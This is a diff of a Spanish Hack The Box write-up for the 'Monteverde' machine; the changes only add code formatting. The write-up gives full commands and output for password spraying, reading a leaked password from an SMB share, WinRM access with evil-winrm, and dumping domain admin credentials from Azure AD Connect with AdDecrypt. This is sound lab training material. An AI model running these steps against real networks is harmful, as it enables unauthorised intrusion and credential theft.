@@ -33,13 +33,13 @@ image:
 
 ## Descripción
 
-Monteverde es una máquina medium windows, enumeramos LDAP y RPC obteniendo un listado de usuarios, a través de un ataque de password spraying, se descubre que la cuenta SABatchJobs tiene como contraseña el mismo nombre de usuario. Usando esta cuenta, es posible enumerar los recursos compartidos SMB en el sistema, y se encuentra que el recurso compartido $users es de lectura pública. Se halla un archivo XML utilizado para una cuenta de Azure AD dentro de una carpeta de usuario y contiene una contraseña. Debido a que se reutilizan contraseñas, es posible conectarse al controlador de dominio como mhope usando WinRM. La enumeración muestra que Azure AD Connect está instalado, por lo que es posible extraer las credenciales de la cuenta que replica los cambios del directorio a Azure, en este caso del administrador del dominio
+`Monteverde` es una máquina `medium windows`, enumeramos `LDAP` y `RPC` obteniendo un `listado` de `usuarios`, a través de un `ataque` de `password spraying`, se descubre que la cuenta `SABatchJobs` tiene como `contraseña` el mismo `nombre` de `usuario`. Usando esta cuenta, es posible `enumerar` los recursos compartidos `SMB` en el sistema, y se encuentra que el recurso compartido `$users` es de lectura pública. Se halla un archivo `XML` utilizado para una `cuenta` de `Azure AD` dentro de una `carpeta` de `usuario` y `contiene` una `contraseña`. Debido a que se `reutilizan contraseñas`, es posible `conectarse` al `controlador` de `dominio` como `mhope` usando `WinRM`. La enumeración muestra que `Azure AD Connect` está instalado, por lo que es posible `extraer` las `credenciales` de la `cuenta` que `replica` los `cambios` del `directorio a Azure`, en este caso del `administrador` del `dominio`
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas windows suele ser 128, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.228.111
@@ -55,7 +55,7 @@ rtt min/avg/max/mdev = 54.386/54.624/54.758/0.168 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.228.111 -oG openPorts
@@ -113,7 +113,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.73 seconds
            Raw packets sent: 196593 (8.650MB) | Rcvd: 45 (1.980KB)
 ```
 
-Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49693,49746 10.129.228.111 -Pn -oN services
@@ -159,7 +159,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.18 seconds
 
 ### RPC Enumeration
 
-Enumeramos usuarios del dominio con la herramienta de [https://github.com/rubenza02/rpcenumeration](https://github.com/rubenza02/rpcenumeration) y guardamos el listado de usuarios en un archivo
+`Enumeramos usuarios` del `dominio` con la herramienta de [https://github.com/rubenza02/rpcenumeration](https://github.com/rubenza02/rpcenumeration) y `guardamos` el `listado` de `usuarios` en un archivo
 
 ```
 # rpcenumeration -s 10.129.228.111 -n -f enum_users
@@ -180,7 +180,7 @@ smorgan           0xa37
 
 ### LDAP Enumeration
 
-Enumeramos los contextos de nombre de DNS del directorio activo
+`Enumeramos` los `contextos` de `nombre` de `DNS` del `directorio activo`
 
 ```
 # ldapsearch -x -H ldap://10.129.228.111 -s base namingcontexts
@@ -208,7 +208,7 @@ result: 0 Success
 # numEntries: 1
 ```
 
-Agregamos el dominio al /etc/hosts
+`Agregamos` el `dominio` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -221,7 +221,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Obtenemos toda la información disponible del dominio y filtramos por los usuarios que tiene un directorio home en la máquina
+`Obtenemos` toda la `información` disponible del `dominio` y `filtramos` por los `usuarios` que tiene un directorio home en la máquina
 
 ```
 # ldapsearch -x -H ldap://10.129.228.111 -b 'DC=MEGABANK,DC=LOCAL' | grep homeDirectory                      
@@ -231,7 +231,7 @@ homeDirectory: \\monteverde\users$\roleary
 homeDirectory: \\monteverde\users$\smorgan
 ```
 
-Incorporamos estos usuarios al listado de usuarios que teníamos anteriormente
+`Incorporamos` estos `usuarios` al `listado` de `usuarios` que teníamos anteriormente
 
 ```
 Guest
@@ -252,14 +252,14 @@ smorgan
 
 ### SMB Enumeration
 
-Obtenemos el nombre de la máquina y el dominio
+`Obtenemos` el `nombre` de la `máquina` y el `dominio`
 
 ```
 # netexec smb 10.129.228.111                                                                                                            
 SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
 ```
 
-Hacemos un password spraying para ver si algún usuario tiene como contraseña la misma que su nombre y obtenemos unas credenciales
+`Hacemos` un `password spraying` para ver si algún usuario tiene como `contraseña` la `misma` que su `nombre` y `obtenemos` unas `credenciales`
 
 ```
 # netexec smb 10.129.228.111 -u users -p users --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
@@ -268,7 +268,7 @@ SMB                      10.129.228.111  445    MONTEVERDE       [*] Windows 10 
 SMB                      10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
 ```
 
-Listamos los recursos compartidos
+`Listamos` los `recursos` compartidos
 
 ```
 # netexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
@@ -287,7 +287,7 @@ SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ        
 SMB         10.129.228.111  445    MONTEVERDE       users$          READ           
 ```
 
-Nos conectamos por smb y nos descargamos el archivo azure.xml
+Nos `conectamos` por `smb` y nos `descargamos` el archivo `azure.xml`
 
 ```
 # smbclient -U 'SABatchJobs%SABatchJobs' //10.129.228.111/users$       
@@ -313,20 +313,20 @@ getting file \mhope\azure.xml of size 1212 as azure.xml (4.2 KiloBytes/sec) (ave
 smb: \mhope\> exit
 ```
 
-El archivo está en UTF-16 por lo que no es legible
+El `archivo` está en `UTF-16` por lo que `no` es `legible`
 
 ```
 # file azure.xml 
 azure.xml: Unicode text, UTF-16, little-endian text, with CRLF line terminators
 ```
 
-Convertimos el archivo de UTF-16 a UTF-8 para que sea legible
+`Convertimos` el `archivo` de `UTF-16` a `UTF-8` para que sea `legible`
 
 ```
 # iconv -f UTF-16 -t UTF-8 azure.xml -o output.xml
 ```
 
-Ahora podemos visualizar el archivo correctamente
+Ahora podemos `visualizar` el `archivo` correctamente
 
 ```
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -346,7 +346,7 @@ Ahora podemos visualizar el archivo correctamente
 </Objs>
 ```
 
-Validamos usuarios con este contraseña y obtenemos unas credenciales válidas
+`Validamos usuarios` con este `contraseña` y `obtenemos` unas `credenciales` válidas
 
 ```
 # netexec winrm 10.129.228.111 -u users -p '4n0therD4y@n0th3r$'         
@@ -359,7 +359,7 @@ WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0
 
 ## Intrusión
 
-Accedemos a la máquina víctima mediante el servicio winrm
+`Accedemos` a la `máquina víctima` mediante el servicio `winrm`
 
 ```
 # evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'      
@@ -377,7 +377,7 @@ megabank\mhope
 
 ## Privilege Escalation
 
-Listamos toda la información del usuario y vemos que el usuario pertenece al grupo Azure Admins
+`Listamos` toda la `información` del `usuario` y vemos que el usuario `pertenece` al grupo `Azure Admins`
 
 ```
 *Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all
@@ -425,7 +425,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Listamos la información del directorio Program Files
+`Listamos` la `información` del directorio `Program Files`
 
 ```
 *Evil-WinRM* PS C:\Program Files> dir
@@ -460,7 +460,7 @@ d-----        9/15/2018  12:19 AM                Windows Security
 d-----         1/3/2020   5:28 AM                WindowsPowerShell
 ```
 
-Si hacemos la búsqueda de Microsoft Azure AD Sync exploit en google nos encontramos con [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), donde se explica como escalar privilegios. Lo primero es descargar los archivos [https://github.com/VbScrub/AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) y posteriormente subirlos a la máquina víctima con evil-winrm, para ello deben estar en el mismo directorio desde el cual nos conectamos
+Si hacemos la búsqueda de `Microsoft Azure AD Sync exploit` en `google` nos encontramos con [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), donde se explica como `escalar privilegios`. Lo primero es `descargar` los `archivos` [https://github.com/VbScrub/AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) y posteriormente `subirlos` a la `máquina víctima` con `evil-winrm`, para ello deben estar en el `mismo directorio` desde el cual nos `conectamos`
 
 ```
 *Evil-WinRM* PS C:\Users\mhope\Documents> upload AdDecrypt.exe
@@ -475,7 +475,7 @@ Info: Uploading /home/justice-reaper/Downloads/mcrypt.dll to C:\Users\mhope\Docu
 Info: Upload successful!
 ```
 
-Ejecutamos el binario y obtenemos las credenciales del usuario administrador, para que funcione debemos estar dentro del directorio C:\Program Files\Microsoft Azure AD Sync\Bin
+`Ejecutamos` el `binario` y `obtenemos` las `credenciales` del usuario `administrador`, para que funcione debemos estar dentro del directorio `C:\Program Files\Microsoft Azure AD Sync\Bin`
 
 ```
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
@@ -498,7 +498,7 @@ Password: d0m@in4dminyeah!
 Domain: MEGABANK.LOCAL
 ```
 
-Nos conectamos a la máquina víctima como el usuario Administrator
+Nos `conectamos` a la `máquina víctima` como el usuario `Administrator`
 
 ```
 # evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'   
